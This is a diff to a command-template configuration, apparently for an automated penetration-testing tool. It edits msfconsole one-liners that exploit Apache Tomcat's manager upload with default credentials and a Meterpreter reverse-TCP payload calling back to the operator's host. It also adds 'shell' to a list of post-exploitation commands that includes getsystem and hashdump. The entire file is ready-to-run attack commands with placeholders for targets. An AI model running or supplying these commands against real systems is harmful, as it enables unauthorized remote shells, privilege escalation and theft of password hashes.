@@ -41,8 +41,8 @@ group: Exploit Command
 [Echidna]
 pattern: Any command since no filter script
 name: exploit tomcat service using default credentials
-template: msfconsole -x "use exploit/multi/http/tomcat_mgr_upload; set PAYLOAD java/meterpreter/reverse_tcp; set rhosts {ipv4}; set HTTPUSERNAME tomcat; set HTTPPASSWORD s3cret; set RPORT 8080; exploit"
-template: msfconsole -x "use exploit/multi/http/tomcat_mgr_upload; set PAYLOAD java/meterpreter/reverse_tcp; set rhosts {host}; set HTTPUSERNAME tomcat; set HTTPPASSWORD s3cret; set RPORT 8080; exploit"
+template: msfconsole -x "use exploit/multi/http/tomcat_mgr_upload; set PAYLOAD java/meterpreter/reverse_tcp; set rhosts {ipv4}; set lhost {localip}; set HTTPUSERNAME tomcat; set HTTPPASSWORD s3cret; set RPORT 8080; exploit"
+template: msfconsole -x "use exploit/multi/http/tomcat_mgr_upload; set PAYLOAD java/meterpreter/reverse_tcp; set rhosts {host}; set lhost {localip}; set HTTPUSERNAME tomcat; set HTTPPASSWORD s3cret; set RPORT 8080; exploit"
 condition: {".*": ["tomcat"]}
 group: Exploit Command
 [end]
@@ -176,6 +176,7 @@ group: HTTP
 pattern: any command is fine since no parser script
 name: meterpreter shell command
 template: getsystem
+template: shell
 template: getprivs
 template: hashdump
 template: getuid
